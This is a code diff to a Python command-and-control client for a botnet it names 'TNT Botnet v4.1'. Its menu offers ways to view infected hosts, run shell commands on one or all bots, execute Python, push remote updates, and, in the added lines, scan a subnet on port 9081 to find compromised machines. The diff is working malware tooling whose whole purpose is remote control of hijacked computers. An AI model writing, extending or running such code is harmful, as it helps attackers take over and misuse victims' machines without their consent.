@@ -1,4 +1,4 @@
-import socket, platform, os
+import socket, platform, os, ipaddress
 #SCREENSHOTTER
 answerable_cmdlets = ["cat", "selftest", "ls", "screenshot"]
 onearg_cmdlets = ["cat", "shell", "talk", "execpy", "mkdir", "rmdir", "rm", "ls"]
@@ -82,7 +82,7 @@ if platform.system() == "Windows":
         "rerun_please": "[*] Rerun program to complete the changes!",
         "mass_shell": "commander@botnet > ",
         "bye": "Thanks for using this tool!",
-        "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot\n[6] Avaliable commands",
+        "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot\n[6] Avaliable commands\n[7] Scan bots in network\n[8] Empty bot list",
         "Greetings": "Bot Controller For TNT Botnet v4.1",
         "Answer_from_bot": "[*] Bot sent answer:\n",
         "require_option": "[?] This commandlet requires an option: ",
@@ -102,7 +102,10 @@ if platform.system() == "Linux":
 \u001b[39m[\u001b[36m3\u001b[39m] Mass attack
 \u001b[39m[\u001b[36m4\u001b[39m] Attach a bot
 \u001b[39m[\u001b[36m5\u001b[39m] Update bot
-\u001b[39m[\u001b[36m6\u001b[39m] Avaliable commands''',
+\u001b[39m[\u001b[36m6\u001b[39m] Avaliable commands
+\u001b[39m[\u001b[36m7\u001b[39m] Scan bots in network
+\u001b[39m[\u001b[36m8\u001b[39m] Empty bot list
+''',
         "Greetings": "\u001b[31mBot Controller For TNT Botnet \u001b[31mv4.1\u001b[39m\n\n\n",
         "Answer_from_bot": "\u001b[39m[\u001b[92m*\u001b[39m]\u001b[32m Bot sent answer:\u001b[39m\n",
         "require_option": "\u001b[39m[\u001b[33m?\u001b[39m]\u001b[93m This commandlet requires an option:\u001b[39m ",
@@ -173,6 +176,7 @@ try:
                 for one_bot in bots_ipv4s_list:
                     print(GetInfoOfTheBot(one_bot))
             else: print(cmds["no_bots_error"])
+
         elif int(com) == 2:
             i = 0
             if (bots_ipv4s_list != None):
@@ -184,15 +188,18 @@ try:
                     i+=1
                 attack_a_bot(bots_ipv4s_list[int(input(cmds["require_option"]))], input(cmds["require_option"]))
             else: print(cmds["no_bots_error"])
+
         elif int(com) == 3:
             if bots_ipv4s_list != None:
                 com = input(cmds["mass_shell"])
                 for one_bot in bots_ipv4s_list:
                     attack_a_bot(one_bot, com)
             else:print(cmds["no_bots_error"])
+
         elif int(com) == 4:
             add_a_bot(input(cmds["require_option"]).strip())
             print(cmds["rerun_please"])
+
         elif int(com) == 5:
             i=0
             packet = input(cmds["require_option"])
@@ -205,8 +212,33 @@ try:
             bot = input(cmds["require_option"])
             remote_update(bots_ipv4s_list[int(bot)], packet)
             print(cmds["success"])
+
         elif int(com) == 6:
             print(help_message)
+
+        elif int(com) == 7:
+            netip = input("[Network IP] > ")
+            subnet = input("[Subnet] > ")
+            to = input("[Timeout in S (press ENTER to set 0.2)] > ")
+            if to == "":
+                to = 0.2
+            else:
+                to = int(to)
+            net = ipaddress.ip_network(f"{netip}/{subnet}")
+            for i in net:
+                s = socket.socket()
+                s.settimeout(to)
+                code = s.connect_ex((str(i), 9081))
+                if code == 10035:
+                    print(f"[{str(i)}] [-]")
+                elif code == 0:
+                    s.close()
+                    print(f"\n[{str(i)}] [+] {GetInfoOfTheBot(str(i))}\n")
+                s.close()
+        elif int(com) == 8:
+            open("botbase.txt", "w")
+            print("\n[*] Emptied! Rerun program to complete changes.")
+
         input("\n\n\nPress enter to continue")
         clear_screen()
 
